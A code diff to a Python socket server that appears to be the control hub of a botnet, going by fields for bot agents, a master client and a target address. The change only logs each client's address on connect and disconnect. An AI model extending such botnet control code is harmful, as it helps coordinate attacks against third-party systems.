@@ -25,6 +25,7 @@ class Server():
         self.port = port
         self.sock: socket.socket = None
         self.socket_list: list[socket.socket] = []
+        self.socket_addr_list: dict[socket.socket, str] = {}
         self.bot_agents: dict[socket.socket, str] = {}
         self.master_client: socket.socket = None
         self.target_address: str = ''
@@ -66,8 +67,10 @@ class Server():
         return
 
     def _accept_wrapper(self, notified_sock: socket.socket) -> None:
+        new_sock_addr = str(notified_sock.getpeername())
         self.socket_list.append(notified_sock)
-        print(f'New client connected > {str(notified_sock.getpeername())}')
+        self.socket_addr_list[notified_sock] = new_sock_addr
+        print(f'New client connected > {new_sock_addr}')
 
         # Ask client to identify themselves
         notified_sock.send('whoami:_'.encode(ENCODING))
@@ -185,7 +188,11 @@ class Server():
         return
 
     def _disconnect_wrapper(self, sock: socket.socket) -> None:
+        sock_addr = self.socket_addr_list[sock]
+
         self.socket_list.remove(sock)
+        del self.socket_addr_list[sock]
+
         # bot agent disconnect
         if sock in self.bot_agents:
             del self.bot_agents[sock]
@@ -194,13 +201,13 @@ class Server():
                 bots = self._get_bot_list()
                 self.master_client.sendall(
                     f'listbot:{bots}'.encode(ENCODING))
-            print(f'bot agent disconnected')
+            print(f'bot agent {sock_addr} disconnected')
         # master client disconnect
         elif self.master_client == sock:
             self.master_client = None
-            print(f'master client disconnected')
+            print(f'master client {sock_addr} disconnected')
         else:
-            print(f'unauthorized client disconnected')
+            print(f'unauthorized client {sock_addr} disconnected')
 
         return
 
